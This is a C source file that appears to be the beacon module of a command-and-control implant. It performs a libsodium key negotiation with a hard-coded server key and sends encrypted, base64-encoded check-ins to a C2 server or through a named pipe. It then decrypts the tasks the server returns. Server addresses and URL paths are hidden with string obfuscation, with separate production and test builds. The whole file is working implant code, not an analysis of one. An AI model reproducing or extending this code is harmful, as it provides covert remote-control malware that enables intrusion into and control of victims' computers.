#include "beacon.h"

// Create a beacon structure, encode it into bytes
DWORD beacon_create(uint8_t* buffer, char* guid, size_t bufferSize, size_t* actualStreamSize) {
    // Message Encoding
    Beacon_pulse message = Beacon_pulse_init_zero;
    debug_printf("beacon_create() - guid is %s \n", guid);
    strcpy(message.guid, guid);
    pb_ostream_t stream = pb_ostream_from_buffer(buffer, bufferSize);
    size_t err_check = serialize(&stream, &message, Beacon_pulse_fields); if (err_check == 0) return ERROR_GEN_FAILURE;
    
    *actualStreamSize = err_check;
    return ERROR_SUCCESS; // Success
}

/* Key Negotiating Functions */
DWORD decode_server_pk_fixed(uint8_t* server_pk_fixed) {
    /* Decode the server's public key from Base64 */
    size_t server_pk_len;
    LAIKA_BOX_STARTVAR(char*, server_pk_b64, KEY_beaconh_SERVER_PK_B64, DATA_beaconh_SERVER_PK_B64);
    sodium_base642bin(server_pk_fixed, crypto_kx_PUBLICKEYBYTES, server_pk_b64, custom_strlen(server_pk_b64),
                          NULL, &server_pk_len, NULL, sodium_base64_VARIANT_ORIGINAL);
    LAIKA_BOX_ENDVAR(server_pk_b64);
    return ERROR_SUCCESS;
}

DWORD generate_handshake_keys(uint8_t* client_pk, uint8_t* client_sk, 
                             uint8_t* client_rx, uint8_t* client_tx,
                             uint8_t* server_pk) {
    if (crypto_box_keypair(client_pk, client_sk) != 0) {
        return ERROR_GEN_FAILURE;
    }
    /* Generating Root symmetric Keys */
    if (crypto_kx_client_session_keys(client_rx, client_tx,
                                    client_pk, client_sk, server_pk) != 0) {
        return ERROR_GEN_FAILURE;
    }
    return ERROR_SUCCESS;
}

DWORD get_server_pk_current(char* buffer_received, size_t actualReceivedSize,
                            uint8_t* client_sk, uint8_t* client_pk,
                            uint8_t* server_pk_current) {
    uint8_t buffer_decode_rcv[4096]; size_t actualDecodedSize;
    
    // B64 decode the message received
    sodium_base642bin(buffer_decode_rcv, sizeof(buffer_decode_rcv), 
        buffer_received, actualReceivedSize, NULL, 
        &actualDecodedSize, NULL, sodium_base64_VARIANT_ORIGINAL);

    // Decrypt the message using implant current pk
    if (crypto_box_seal_open(server_pk_current, buffer_decode_rcv, actualDecodedSize,
                         client_pk, client_sk) != 0) {
        debug_printf("[-] In get_server_pk_current(): message corrupted or not intended for this recipient\n");
        return ERROR_GEN_FAILURE;
    }
    return ERROR_SUCCESS;
}

DWORD serialize_reg_msg(uint8_t* client_pk, char* client_guid_real, uint8_t* buffer_serialize, size_t* actualSerializedSize) {
    // Debugger:
    print_base64(client_pk, crypto_kx_PUBLICKEYBYTES);
    debug_printf(client_guid_real);
    Key_negotiation_implant msg_reg = Register_init_zero;
    msg_reg.client_pk_bin.size = crypto_kx_PUBLICKEYBYTES;
    memcpy(msg_reg.client_pk_bin.bytes, client_pk, crypto_kx_PUBLICKEYBYTES);
    strcpy(msg_reg.client_guid, client_guid_real);

    pb_ostream_t stream_o = pb_ostream_from_buffer(buffer_serialize, 4096);
    size_t err_check = serialize(&stream_o, &msg_reg, Key_negotiation_implant_fields);
    if (err_check == 0) {
        debug_printf( "[-] In serialize_reg_msg: Can't serialize buffer for pubkey.\n");
        return ERROR_GEN_FAILURE;
    }
    *actualSerializedSize = err_check;
    return ERROR_SUCCESS;
}

DWORD seal_reg_msg_o_b64(uint8_t* buffer_serialize, size_t actualSerializedSize, 
                         char* buffer_send, size_t buffer_send_size, 
                         uint8_t* server_pk_fixed) {
    uint8_t ciphertext_bin[crypto_box_SEALBYTES + actualSerializedSize];
    if(crypto_box_seal(ciphertext_bin, buffer_serialize, 
                    actualSerializedSize, server_pk_fixed) != 0) {
        debug_printf( "[-] In seal_reg_msg_o_b64: Can't seal msg.\n");
        return ERROR_GEN_FAILURE;
    }
    sodium_bin2base64(buffer_send, buffer_send_size, 
                      ciphertext_bin, 
                      sizeof(ciphertext_bin),
                      sodium_base64_VARIANT_ORIGINAL);
    return ERROR_SUCCESS;
}

DWORD key_negotiation_new(char* client_guid_real_b64,
                          uint8_t* nonce_send, uint8_t* nonce_rcv, uint8_t* suburl_bin,
                          uint8_t* key_kdf_send, uint8_t* key_kdf_rcv, uint8_t* key_kdf_guid,
                          uint8_t* session_key_send, uint8_t* session_key_rcv, uint8_t* client_guid_ephemeral) {
    
    // Generate client asym key pair
    uint8_t client_pk[crypto_kx_PUBLICKEYBYTES], client_sk[crypto_kx_SECRETKEYBYTES];
    crypto_box_keypair(client_pk, client_sk);

    // Getting server_pk_fixed in binary
    uint8_t server_pk_fixed[crypto_kx_PUBLICKEYBYTES];
    if(decode_server_pk_fixed(server_pk_fixed) != ERROR_SUCCESS) {
        return ERROR_GEN_FAILURE;
    }
    debug_printf("server pk fixed: ");print_base64(server_pk_fixed, crypto_kx_PUBLICKEYBYTES);debug_printf("\n");

    // serialize the key negotiating message
    uint8_t buffer_serialize[4096]; size_t actualSerializedSize;
    if(serialize_reg_msg(client_pk, client_guid_real_b64, 
                         buffer_serialize, &actualSerializedSize) != ERROR_SUCCESS) {
        return ERROR_GEN_FAILURE;
    }
    
    char buffer_send[4096];
    // seal (encrypt) the key negotiating message
    if(seal_reg_msg_o_b64(buffer_serialize, actualSerializedSize,
                          buffer_send, 4096,
                          server_pk_fixed) != ERROR_SUCCESS) {
        return ERROR_GEN_FAILURE;
    }
    // Generate URL for register message
    // uint8_t suburl_bin[crypto_aead_chacha20poly1305_NPUBBYTES], 
    // uint8_t* client_guid_ephemeral[crypto_kx_SESSIONKEYBYTES];
    char URL[URL_SIZE] = {0};
    if (derive_nonce_kdf_session(client_pk, sizeof(client_pk), 
                                 suburl_bin, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                 key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                 client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
        debug_printf("[-] Can't generate register url\n");
        return ERROR_GEN_FAILURE;
    }
    LAIKA_BOX_STARTVAR(char*, path_register, KEY_interneth_PATH_REGISTER, DATA_interneth_PATH_REGISTER)
    getting_URL(suburl_bin, path_register, URL);
    LAIKA_BOX_ENDVAR(path_register)
    // Send data to server
    DWORD buffer_size_received = 4096; char buffer_received[buffer_size_received]; DWORD actualReceivedSize;

    #ifdef PRODUCTION
    LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_PROD, DATA_interneth_SERVER_ADDR_PROD);
    #else
    LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_TEST, DATA_interneth_SERVER_ADDR_TEST);
    #endif
    if (connectServer(server_addr, SERVER_PORT_C2, URL, 
                        (LPBYTE) buffer_send, custom_strlen(buffer_send), 
                        (LPBYTE) buffer_received, buffer_size_received, 
                        &actualReceivedSize) != ERROR_SUCCESS) {
        debug_printf("[-] Can't send protobuf in Initial Key exchange\n");
        return ERROR_NOT_CONNECTED;
    }
    LAIKA_BOX_ENDVAR(server_addr);
    
    // server will respond a dedicated public key
    uint8_t server_pk_current[crypto_kx_PUBLICKEYBYTES];
    if (get_server_pk_current(buffer_received, actualReceivedSize, 
                              client_sk, client_pk, 
                              server_pk_current) != ERROR_SUCCESS) {
        debug_printf("[-] Can't get server_pk_current from server\n");
        return ERROR_GEN_FAILURE;
    }
    uint8_t client_rx[crypto_kx_SESSIONKEYBYTES], client_tx[crypto_kx_SESSIONKEYBYTES];
    // Generate rcv and send root sym key
    if (crypto_kx_client_session_keys(client_rx, client_tx,
                                    client_pk, client_sk, server_pk_current) != 0) {
        debug_printf("[-] Can't generate client_rx, client_tx\n");
        return ERROR_GEN_FAILURE;
    }

    if (ERROR_SUCCESS != derive_nonce_kdf_session(client_tx, sizeof(client_tx), 
                            nonce_send, crypto_aead_chacha20poly1305_NPUBBYTES, 
                            key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                            session_key_send, crypto_kx_SESSIONKEYBYTES)) {
        debug_printf("Can't generate send Session key\n");
        return ERROR_GEN_FAILURE;

    }
    if (ERROR_SUCCESS != derive_nonce_kdf_session(client_rx, sizeof(client_rx), 
                            nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES, 
                            key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                            session_key_rcv, crypto_kx_SESSIONKEYBYTES)) {
        debug_printf("Can't generate rcv Session key\n");
        return ERROR_GEN_FAILURE;

    }
    if (ERROR_SUCCESS != derive_nonce_kdf_session(key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                            suburl_bin, crypto_aead_chacha20poly1305_NPUBBYTES, 
                            key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                            client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES)) {
        debug_printf("Can't generate rcv Session key\n");
        return ERROR_GEN_FAILURE;

    }
    return ERROR_SUCCESS;
}

DWORD key_negotiation_client_mode(char* client_guid_real_b64,
                          uint8_t* nonce_send, uint8_t* nonce_rcv, uint8_t* suburl_bin,
                          uint8_t* key_kdf_send, uint8_t* key_kdf_rcv, uint8_t* key_kdf_guid,
                          uint8_t* session_key_send, uint8_t* session_key_rcv, uint8_t* client_guid_ephemeral,
                          char* pipeFullPath) {
    
    // Generate client asym key pair
    uint8_t client_pk[crypto_kx_PUBLICKEYBYTES], client_sk[crypto_kx_SECRETKEYBYTES];
    crypto_box_keypair(client_pk, client_sk);

    // Getting server_pk_fixed in binary
    uint8_t server_pk_fixed[crypto_kx_PUBLICKEYBYTES];
    if(decode_server_pk_fixed(server_pk_fixed) != ERROR_SUCCESS) {
        return ERROR_GEN_FAILURE;
    }
    debug_printf("server pk fixed: ");print_base64(server_pk_fixed, crypto_kx_PUBLICKEYBYTES);debug_printf("\n");

    // serialize the key negotiating message
    uint8_t buffer_serialize[4096]; size_t actualSerializedSize;
    if(serialize_reg_msg(client_pk, client_guid_real_b64, 
                         buffer_serialize, &actualSerializedSize) != ERROR_SUCCESS) {
        return ERROR_GEN_FAILURE;
    }
    
    char buffer_data[4096];
    // seal (encrypt) the key negotiating message
    if(seal_reg_msg_o_b64(buffer_serialize, actualSerializedSize,
                          buffer_data, 4096,
                          server_pk_fixed) != ERROR_SUCCESS) {
        return ERROR_GEN_FAILURE;
    }
    DWORD buffer_data_len = strlen(buffer_data);
    // Generate URL for register message
    // uint8_t suburl_bin[crypto_aead_chacha20poly1305_NPUBBYTES], 
    // uint8_t* client_guid_ephemeral[crypto_kx_SESSIONKEYBYTES];
    char URL[URL_SIZE] = {0};
    if (derive_nonce_kdf_session(client_pk, sizeof(client_pk), 
                                 suburl_bin, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                 key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                 client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
        debug_printf("[-] Can't generate register url\n");
        return ERROR_GEN_FAILURE;
    }
    
    char buffer_send[4096 + URL_SIZE];
    
    LAIKA_BOX_STARTVAR(char*, path_register, KEY_interneth_PATH_REGISTER, DATA_interneth_PATH_REGISTER)
    getting_URL(suburl_bin, path_register, URL);
    LAIKA_BOX_ENDVAR(path_register);

    memcpy(buffer_send, URL, URL_SIZE);
    memcpy(&buffer_send[URL_SIZE], buffer_data, sizeof(buffer_data));

    // Send data to server
    DWORD buffer_size_received = 4096; char buffer_received[buffer_size_received]; DWORD actualReceivedSize;
    if (pipeClient(pipeFullPath, (LPBYTE) buffer_send, buffer_data_len + URL_SIZE, 
                   (LPBYTE) buffer_received, buffer_size_received, &actualReceivedSize) != 0) {
        debug_printf("[-] Can't send buffer to pipe");
        return ERROR_NOT_CONNECTED;
    }

    // server will respond a dedicated public key
    uint8_t server_pk_current[crypto_kx_PUBLICKEYBYTES];
    if (get_server_pk_current(buffer_received, actualReceivedSize, 
                              client_sk, client_pk, 
                              server_pk_current) != ERROR_SUCCESS) {
        debug_printf("[-] Can't get server_pk_current from server\n");
        return ERROR_GEN_FAILURE;
    }
    uint8_t client_rx[crypto_kx_SESSIONKEYBYTES], client_tx[crypto_kx_SESSIONKEYBYTES];
    // Generate rcv and send root sym key
    if (crypto_kx_client_session_keys(client_rx, client_tx,
                                    client_pk, client_sk, server_pk_current) != 0) {
        debug_printf("[-] Can't generate client_rx, client_tx\n");
        return ERROR_GEN_FAILURE;
    }

    if (ERROR_SUCCESS != derive_nonce_kdf_session(client_tx, sizeof(client_tx), 
                            nonce_send, crypto_aead_chacha20poly1305_NPUBBYTES, 
                            key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                            session_key_send, crypto_kx_SESSIONKEYBYTES)) {
        debug_printf("Can't generate send Session key\n");
        return ERROR_GEN_FAILURE;

    }
    if (ERROR_SUCCESS != derive_nonce_kdf_session(client_rx, sizeof(client_rx), 
                            nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES, 
                            key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                            session_key_rcv, crypto_kx_SESSIONKEYBYTES)) {
        debug_printf("Can't generate rcv Session key\n");
        return ERROR_GEN_FAILURE;

    }
    if (ERROR_SUCCESS != derive_nonce_kdf_session(key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                            suburl_bin, crypto_aead_chacha20poly1305_NPUBBYTES, 
                            key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                            client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES)) {
        debug_printf("Can't generate rcv Session key\n");
        return ERROR_GEN_FAILURE;

    }
    return ERROR_SUCCESS;
}

DWORD beacon_c2(uint8_t* client_guid_ephemeral, uint8_t* suburl_bin, char* client_guid_real_b64, 
                    uint8_t* nonce_send, uint8_t* session_key_send,
                    uint8_t* nonce_rcv, uint8_t* session_key_rcv,
                    uint8_t* buffer_decrypt_decode_rcv, size_t* actualDecryptedSize,
                    uint8_t* key_kdf_guid, uint8_t* key_kdf_send, uint8_t* key_kdf_rcv) {

    char client_guid_ephemeral_b64[crypto_kx_PUBLICKEYBYTES * 2];
    char URL[URL_SIZE] = {0};

    sodium_bin2base64(client_guid_ephemeral_b64, sizeof(client_guid_ephemeral_b64), 
                      client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES, 
                      sodium_base64_VARIANT_ORIGINAL);
    debug_printf("In beacon_c2(), client_guid_ephemeral_b64: %s\n", client_guid_ephemeral_b64);
    
    LAIKA_BOX_STARTVAR(char*, path_beacon, KEY_interneth_PATH_BEACON, DATA_interneth_PATH_BEACON)
    getting_URL(suburl_bin, path_beacon, URL);
    LAIKA_BOX_ENDVAR(path_beacon);

    /* Create Beacon Message */
    uint8_t buffer_serialize[4096]; size_t actualSerializedSize;

    if (beacon_create(buffer_serialize, client_guid_real_b64, 
                      sizeof(buffer_serialize), &actualSerializedSize) != ERROR_SUCCESS) {
        debug_printf("Can't create beacon!\n");
        return ERROR_GEN_FAILURE;
    }
    debug_printf("[+] Beacon Message Created \n");

    /* Encrypt message */
    uint8_t ciphertext[actualSerializedSize + crypto_aead_chacha20poly1305_ABYTES];
    size_t ciphertext_len;
    crypto_aead_chacha20poly1305_encrypt(
                                    ciphertext, &ciphertext_len,
                                    buffer_serialize, actualSerializedSize,
                                    NULL, 0, NULL, 
                                    nonce_send, session_key_send);
    debug_printf("[+] Beacon Message Encrypted \n");

    // Encapsulate Message into msg_enc
    Message_encrypt msg_enc = Message_encrypt_init_zero;
    msg_enc.ciphertext.size = ciphertext_len;
    memcpy(msg_enc.ciphertext.bytes, ciphertext, ciphertext_len);
    strcpy(msg_enc.guid, client_guid_ephemeral_b64);
    
    // Serialzie Data Again
    SecureZeroMemory(buffer_serialize, sizeof(buffer_serialize));
    pb_ostream_t stream_o = pb_ostream_from_buffer(buffer_serialize, sizeof(buffer_serialize));
    size_t err_check = serialize(&stream_o, &msg_enc, Message_encrypt_fields);
    if (err_check == 0) debug_printf( "[-] Can't serialize buffer for msg_enc.\n");
    actualSerializedSize = err_check;

    char buffer_send[4096];
    // Encode Base64
    sodium_bin2base64(buffer_send, sizeof(buffer_send), 
                buffer_serialize, actualSerializedSize,
                sodium_base64_VARIANT_ORIGINAL);
    debug_printf("[+] Beacon Message Encrypted and Base64 Encoded \n");
    
    char buffer_received[4096]; DWORD actualReceivedSize;
    #ifdef PRODUCTION
    LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_PROD, DATA_interneth_SERVER_ADDR_PROD);
    #else
    LAIKA_BOX_STARTVAR(char*, server_addr, KEY_interneth_SERVER_ADDR_TEST, DATA_interneth_SERVER_ADDR_TEST);
    #endif
    if (connectServer(server_addr, SERVER_PORT_C2, URL, 
                      (LPBYTE) buffer_send, custom_strlen(buffer_send), 
                      (LPBYTE) buffer_received, sizeof(buffer_received), 
                      &actualReceivedSize) != ERROR_SUCCESS) {
        debug_printf("[-] Can't send protobuf in Beacon\n");
        return ERROR_NOT_CONNECTED;
    }
    LAIKA_BOX_ENDVAR(server_addr);
    uint8_t buffer_decode_rcv[4096]; size_t actualDecodedSize;
    debug_printf("Actual received size in b64:");

    /* Process Incoming Data */
    if (sodium_base642bin(buffer_decode_rcv, sizeof(buffer_decode_rcv), 
                          buffer_received, actualReceivedSize, NULL, 
                          &actualDecodedSize, NULL, sodium_base64_VARIANT_ORIGINAL) != 0)
    {
        debug_printf("[-] Can't Decode Received Data from Base64 \n");
        return ERROR_GEN_FAILURE;
    }

    // Decrypt the received data
    if(crypto_aead_chacha20poly1305_decrypt(buffer_decrypt_decode_rcv, actualDecryptedSize, NULL, 
                                buffer_decode_rcv, actualDecodedSize, 
                                NULL, 0, 
                                nonce_rcv, session_key_rcv) != 0)
    {
        debug_printf("[-] Can't Decrypt received Task from server \n");
        debug_printf("Nonce_rcv:");print_base64(nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES);
        return ERROR_GEN_FAILURE;
    }

    if (derive_nonce_kdf_session(key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                 suburl_bin, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                 key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                 client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
        debug_printf("[-] Can't generate guid_ephmeral subURL and guid_kdf key\n");
        return ERROR_GEN_FAILURE;
    }
    if (derive_nonce_kdf_session(key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                 nonce_send, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                 key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                 session_key_send, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
        debug_printf("[-] Can't generate send Session key\n");
        return ERROR_GEN_FAILURE;
    }
    if (derive_nonce_kdf_session(key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                 nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                 key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                 session_key_rcv, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
        debug_printf("[-] Can't generate rcv Session key\n");
        return ERROR_GEN_FAILURE;
    }
    return ERROR_SUCCESS;
}


DWORD beacon_c2_client(uint8_t* client_guid_ephemeral, uint8_t* suburl_bin, char* client_guid_real_b64, 
                        uint8_t* nonce_send, uint8_t* session_key_send,
                        uint8_t* nonce_rcv, uint8_t* session_key_rcv,
                        uint8_t* buffer_decrypt_decode_rcv, size_t* actualDecryptedSize,
                        uint8_t* key_kdf_guid, uint8_t* key_kdf_send, uint8_t* key_kdf_rcv, 
                        char* pipeFullPath) {

    char client_guid_ephemeral_b64[crypto_kx_PUBLICKEYBYTES * 2];
    char URL[URL_SIZE] = {0};

    sodium_bin2base64(client_guid_ephemeral_b64, sizeof(client_guid_ephemeral_b64), 
                      client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES, 
                      sodium_base64_VARIANT_ORIGINAL);
    debug_printf("In beacon_c2(), client_guid_ephemeral_b64: %s\n", client_guid_ephemeral_b64);

    LAIKA_BOX_STARTVAR(char*, path_beacon, KEY_interneth_PATH_BEACON, DATA_interneth_PATH_BEACON)
    getting_URL(suburl_bin, path_beacon, URL);
    LAIKA_BOX_ENDVAR(path_beacon)

    /* Create Beacon Message */
    uint8_t buffer_serialize[4096]; size_t actualSerializedSize;

    if (beacon_create(buffer_serialize, client_guid_real_b64, 
                      sizeof(buffer_serialize), &actualSerializedSize) != ERROR_SUCCESS) {
        debug_printf("Can't create beacon!\n");
        return ERROR_GEN_FAILURE;
    }
    debug_printf("[+] Beacon Message Created \n");

    /* Encrypt message */
    uint8_t ciphertext[actualSerializedSize + crypto_aead_chacha20poly1305_ABYTES];
    size_t ciphertext_len;
    crypto_aead_chacha20poly1305_encrypt(
                                    ciphertext, &ciphertext_len,
                                    buffer_serialize, actualSerializedSize,
                                    NULL, 0, NULL, 
                                    nonce_send, session_key_send);
    debug_printf("[+] Beacon Message Encrypted \n");

    // Encapsulate Message into msg_enc
    Message_encrypt msg_enc = Message_encrypt_init_zero;
    msg_enc.ciphertext.size = ciphertext_len;
    memcpy(msg_enc.ciphertext.bytes, ciphertext, ciphertext_len);
    strcpy(msg_enc.guid, client_guid_ephemeral_b64);
    
    // Serialzie Data Again
    SecureZeroMemory(buffer_serialize, sizeof(buffer_serialize));
    pb_ostream_t stream_o = pb_ostream_from_buffer(buffer_serialize, sizeof(buffer_serialize));
    size_t err_check = serialize(&stream_o, &msg_enc, Message_encrypt_fields);
    if (err_check == 0) debug_printf( "[-] Can't serialize buffer for msg_enc.\n");
    actualSerializedSize = err_check;

    char buffer_data[4096];
    // Encode Base64
    sodium_bin2base64(buffer_data, sizeof(buffer_data), 
                buffer_serialize, actualSerializedSize,
                sodium_base64_VARIANT_ORIGINAL);
    debug_printf("[+] Beacon Message Encrypted and Base64 Encoded \n");
    DWORD buffer_data_len = strlen(buffer_data);
    char buffer_send[4096 + URL_SIZE];
    memcpy(buffer_send, URL, URL_SIZE);
    memcpy(&buffer_send[URL_SIZE], buffer_data, sizeof(buffer_data));

    char buffer_received[4096]; DWORD actualReceivedSize;

    if (pipeClient(pipeFullPath, (LPBYTE) buffer_send, buffer_data_len + URL_SIZE, 
                   (LPBYTE) buffer_received, sizeof(buffer_received), &actualReceivedSize) != 0) {
        debug_printf("[-] Beacon: Can't send buffer to pipe");
        return ERROR_NOT_CONNECTED;
    }

    uint8_t buffer_decode_rcv[4096]; size_t actualDecodedSize;

    debug_printf("Actual received size in b64:");
    // debug_printf("buffer_decode_rcv in b64:");print_base64(buffer_decode_rcv, sizeof(buffer_decode_rcv));
    // SecureZeroMemory(buffer_decode_rcv, 4096);

    /* Process Incoming Data */
    if (sodium_base642bin(buffer_decode_rcv, sizeof(buffer_decode_rcv), 
                          buffer_received, actualReceivedSize, NULL, 
                          &actualDecodedSize, NULL, sodium_base64_VARIANT_ORIGINAL) != 0)
    {
        debug_printf("[-] Can't Decode Received Data from Base64 \n");
        return ERROR_GEN_FAILURE;
    }

    // Decrypt the received data
    if(crypto_aead_chacha20poly1305_decrypt(buffer_decrypt_decode_rcv, actualDecryptedSize, NULL, 
                                            buffer_decode_rcv, actualDecodedSize, 
                                            NULL, 0, 
                                            nonce_rcv, session_key_rcv) != 0)
    {
        debug_printf("[-] Can't Decrypt received Task from server \n");
        debug_printf("Nonce_rcv:");print_base64(nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES);
        return ERROR_GEN_FAILURE;
    }

    if (derive_nonce_kdf_session(key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                 suburl_bin, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                 key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                 client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
        debug_printf("[-] Can't generate guid_ephmeral subURL and guid_kdf key\n");
        return ERROR_GEN_FAILURE;
    }
    if (derive_nonce_kdf_session(key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                 nonce_send, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                 key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                 session_key_send, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
        debug_printf("[-] Can't generate send Session key\n");
        return ERROR_GEN_FAILURE;
    }
    if (derive_nonce_kdf_session(key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                 nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                 key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                 session_key_rcv, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
        debug_printf("[-] Can't generate rcv Session key\n");
        return ERROR_GEN_FAILURE;
    }
    return ERROR_SUCCESS;
}
